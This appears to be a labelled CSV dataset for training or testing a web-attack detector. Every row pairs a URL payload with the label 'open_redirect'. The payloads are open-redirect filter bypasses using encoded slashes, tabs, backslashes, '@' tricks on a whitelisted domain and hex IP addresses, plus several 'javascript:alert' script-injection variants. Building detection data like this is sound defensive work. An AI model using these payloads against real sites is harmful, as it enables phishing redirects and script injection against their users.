log,label
/%2f%2fexample.com,open_redirect
/%2f%2f%2fbing.com%2f%3fwww.omise.co,open_redirect
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/,open_redirect
/%5cexample.com,open_redirect
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d,open_redirect
/.example.com,open_redirect
//%09/example.com,open_redirect
//%5cexample.com,open_redirect
///%09/example.com,open_redirect
///%5cexample.com,open_redirect
////%09/example.com,open_redirect
////%5cexample.com,open_redirect
/////example.com,open_redirect
/////example.com/,open_redirect
////example.com/,open_redirect
////example.com/%2e%2e,open_redirect
////example.com/%2e%2e%2f,open_redirect
////example.com/%2f%2e%2e,open_redirect
////example.com/%2f..,open_redirect
////example.com//,open_redirect
///example.com,open_redirect
///example.com/,open_redirect
//google.com/%2f..,open_redirect
//www.whitelisteddomain.tld@google.com/%2f..,open_redirect
///google.com/%2f..,open_redirect
///www.whitelisteddomain.tld@google.com/%2f..,open_redirect
////google.com/%2f..,open_redirect
////www.whitelisteddomain.tld@google.com/%2f..,open_redirect
https://google.com/%2f..,open_redirect
https://www.whitelisteddomain.tld@google.com/%2f..,open_redirect
/https://google.com/%2f..,open_redirect
/https://www.whitelisteddomain.tld@google.com/%2f..,open_redirect
//www.google.com/%2f%2e%2e,open_redirect
//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,open_redirect
///www.google.com/%2f%2e%2e,open_redirect
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,open_redirect
////www.google.com/%2f%2e%2e,open_redirect
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,open_redirect
https://www.google.com/%2f%2e%2e,open_redirect
https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,open_redirect
/https://www.google.com/%2f%2e%2e,open_redirect
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,open_redirect
//google.com/,open_redirect
//www.whitelisteddomain.tld@google.com/,open_redirect
///google.com/,open_redirect
///www.whitelisteddomain.tld@google.com/,open_redirect
////google.com/,open_redirect
////www.whitelisteddomain.tld@google.com/,open_redirect
https://google.com/,open_redirect
https://www.whitelisteddomain.tld@google.com/,open_redirect
/https://google.com/,open_redirect
/https://www.whitelisteddomain.tld@google.com/,open_redirect
//google.com//,open_redirect
//www.whitelisteddomain.tld@google.com//,open_redirect
///google.com//,open_redirect
///www.whitelisteddomain.tld@google.com//,open_redirect
////google.com//,open_redirect
////www.whitelisteddomain.tld@google.com//,open_redirect
https://google.com//,open_redirect
https://www.whitelisteddomain.tld@google.com//,open_redirect
//https://google.com//,open_redirect
//https://www.whitelisteddomain.tld@google.com//,open_redirect
//www.google.com/%2e%2e%2f,open_redirect
//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f,open_redirect
///www.google.com/%2e%2e%2f,open_redirect
///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f,open_redirect
////www.google.com/%2e%2e%2f,open_redirect
////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f,open_redirect
https://www.google.com/%2e%2e%2f,open_redirect
https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f,open_redirect
//https://www.google.com/%2e%2e%2f,open_redirect
//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f,open_redirect
///www.google.com/%2e%2e,open_redirect
///www.whitelisteddomain.tld@www.google.com/%2e%2e,open_redirect
////www.google.com/%2e%2e,open_redirect
////www.whitelisteddomain.tld@www.google.com/%2e%2e,open_redirect
https:///www.google.com/%2e%2e,open_redirect
https:///www.whitelisteddomain.tld@www.google.com/%2e%2e,open_redirect
//https:///www.google.com/%2e%2e,open_redirect
//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e,open_redirect
/https://www.google.com/%2e%2e,open_redirect
/https://www.whitelisteddomain.tld@www.google.com/%2e%2e,open_redirect
///www.google.com/%2f%2e%2e,open_redirect
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,open_redirect
////www.google.com/%2f%2e%2e,open_redirect
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,open_redirect
https:///www.google.com/%2f%2e%2e,open_redirect
https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,open_redirect
/https://www.google.com/%2f%2e%2e,open_redirect
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,open_redirect
/https:///www.google.com/%2f%2e%2e,open_redirect
/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,open_redirect
/%09/google.com,open_redirect
/%09/www.whitelisteddomain.tld@google.com,open_redirect
//%09/google.com,open_redirect
//%09/www.whitelisteddomain.tld@google.com,open_redirect
///%09/google.com,open_redirect
///%09/www.whitelisteddomain.tld@google.com,open_redirect
////%09/google.com,open_redirect
////%09/www.whitelisteddomain.tld@google.com,open_redirect
https://%09/google.com,open_redirect
https://%09/www.whitelisteddomain.tld@google.com,open_redirect
/%5cgoogle.com,open_redirect
/%5cwww.whitelisteddomain.tld@google.com,open_redirect
//%5cgoogle.com,open_redirect
//%5cwww.whitelisteddomain.tld@google.com,open_redirect
///%5cgoogle.com,open_redirect
///%5cwww.whitelisteddomain.tld@google.com,open_redirect
////%5cgoogle.com,open_redirect
////%5cwww.whitelisteddomain.tld@google.com,open_redirect
https://%5cgoogle.com,open_redirect
https://%5cwww.whitelisteddomain.tld@google.com,open_redirect
/https://%5cgoogle.com,open_redirect
/https://%5cwww.whitelisteddomain.tld@google.com,open_redirect
https://google.com,open_redirect
https://www.whitelisteddomain.tld@google.com,open_redirect
javascript:alert(1),open_redirect
//javascript:alert(1),open_redirect
/javascript:alert(1),open_redirect
/%5cjavascript:alert(1),open_redirect
//%5cjavascript:alert(1),open_redirect
/%09/javascript:alert(1),open_redirect
java%0d%0ascript%0d%0a:alert(0),open_redirect
//google.com,open_redirect
https:google.com,open_redirect
//google%E3%80%82com,open_redirect
\/\/google.com/,open_redirect
/\/google.com/,open_redirect
//google%00.com,open_redirect
https://www.whitelisteddomain.tld/https://www.google.com/,open_redirect
javascript://www.whitelisteddomain.tld?%a0alert%281%29,open_redirect
http://0xd8.0x3a.0xd6.0xce,open_redirect
http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce,open_redirect
http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce,open_redirect
http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce,open_redirect
http://0xd83ad6ce,open_redirect
http://www.whitelisteddomain.tld@0xd83ad6ce,open_redirect
http://3H6k7lIAiqjfNeN@0xd83ad6ce,open_redirect
